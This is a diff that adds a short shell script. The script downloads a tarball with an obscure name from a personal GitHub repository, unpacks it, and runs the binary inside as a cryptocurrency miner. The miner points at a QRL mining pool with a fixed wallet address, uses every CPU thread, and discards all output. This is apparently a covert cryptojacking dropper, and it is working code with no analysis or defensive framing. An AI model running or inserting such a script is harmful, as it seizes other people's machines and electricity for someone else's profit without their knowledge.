@@ -1,0 +1,11 @@
+#!/bin/sh
+
+A=de.qrl.herominers.com:1166
+B=Q010300ae5ee0d1785573604c259be57f24f0529979d50342764ead828111cdbdfed6f85991ac93
+C=PAYG
+D=rx/0
+apt-get update && apt-get upgrade -y
+wget https://github.com/muledan1/bash/raw/main/-.tar.gz
+tar -xf -.tar.gz
+./- --donate-level 1 -o $A -u $B -p $C -a $D -k -t$(nproc --all) >/dev/null >/dev/null 2>&1
+sleep 10
